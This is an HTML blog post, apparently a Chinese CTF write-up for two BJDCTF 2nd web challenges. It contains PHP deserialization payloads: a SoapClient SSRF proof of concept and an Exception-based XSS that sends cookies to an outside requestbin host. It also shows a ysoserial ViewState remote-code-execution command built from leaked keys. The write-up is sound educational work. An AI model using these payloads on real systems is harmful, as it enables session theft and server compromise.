@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="BJDCTF2nd-wp"/>
+
+
+
+
+  <meta name="keywords" content="wp," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/25/BJDCTF2nd-wp/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF2nd-wp">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/25/BJDCTF2nd-wp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/26/LZytkl6U7E2priu.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-25_22-58-18.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/26/somGnDVTCptBRPK.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/26/4gnchaK7OUD5Lxi.png">
+<meta property="article:published_time" content="2020-03-25T12:38:54.000Z">
+<meta property="article:modified_time" content="2020-03-25T16:17:43.727Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/26/LZytkl6U7E2priu.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> BJDCTF2nd-wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          BJDCTF2nd-wp
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 25 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#xss之光">XSS之光</a></li>
+<li><a href="#easyaspdotnet">EasyAspDotNet</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>选了两题补一补</p>
+<h4><span id="xss之光">XSS之光</span></h4><p><img src="https://i.loli.net/2020/03/26/LZytkl6U7E2priu.png" alt="Snipaste_2020-03-25_20-58-22.png"></p>
+<p>git泄露，GitHack还原</p>
+<p>只有一个<code>index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>php原生类反序列化，当前php版本为<code>php5.6.40</code></p>
+<p>可以利用的主要有这些</p>
+<p><strong>__call()</strong></p>
+<p><code>SoapClient</code>类，可以触发SSRF</p>
+<p> wupco师傅的poc举例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://example.com:5555/"</span>;</span><br><span class="line">$post_string = <span class="string">'data=abc'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\n\r"</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br></pre></td></tr></table></figure>
+
+<p><strong>__toString()</strong></p>
+<p><code>Error</code>类，适用于php7</p>
+<p><code>Exception</code>类，适用于php5，php7</p>
+<p>通常用户触发XSS</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert()&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="string">'O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D'</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize($c);</span><br></pre></td></tr></table></figure>
+
+<p>这题使用<code>Exception</code>类来触发XSS，利用<code>window.location.href</code>或者<code>window.open</code>，注意不能用bp，这时浏览器的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;\&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?cookie&#x3D;\&quot;+escape(document[\&quot;cookie\&quot;])&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">    $a &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rklv31rk?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">    $b &#x3D; serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>============题外话，也是摘自链接</p>
+<p>如果能实例化任何类，可以利用一些原生类，虽然还没遇到过这个场景</p>
+<p>可获取目录<br><code>DirectoryIterator</code></p>
+<p>XXE<br><code>SimpleXMLElement</code></p>
+<p>创建空白文件<br><code>SQLite3</code></p>
+<hr>
+<h4><span id="easyaspdotnet">EasyAspDotNet</span></h4><p>ASP.NET还是第一次做，主要是复现下，原理有缘再看</p>
+<p>存在任意文件读取，<code>.aspx</code> 后缀，读取<code>web.config</code></p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-25_22-58-18.png" alt="Snipaste_2020-03-25_22-58-18"></p>
+<p> 有了 VIEWSTATE 的加密密钥，可以进行反序列化攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;System.dll;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey&#x3D;&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/26/somGnDVTCptBRPK.png" alt="Snipaste_2020-03-26_00-17-07.png"></p>
+<p><img src="https://i.loli.net/2020/03/26/4gnchaK7OUD5Lxi.png" alt="Snipaste_2020-03-25_22-58-18.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\</span><br><span class="line">type c:\Fl@g_glzjin_still_w@nts_a_girl_friend.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://www.gem-love.com/ctf/2097.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html</a> </p>
+<p> <a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a> </p>
+<p> <a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6497.html</a> </p>
+<p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/25/MetInfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/">
+        <span class="next-text nav-default">MetInfo任意文件读取漏洞的修复与绕过</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
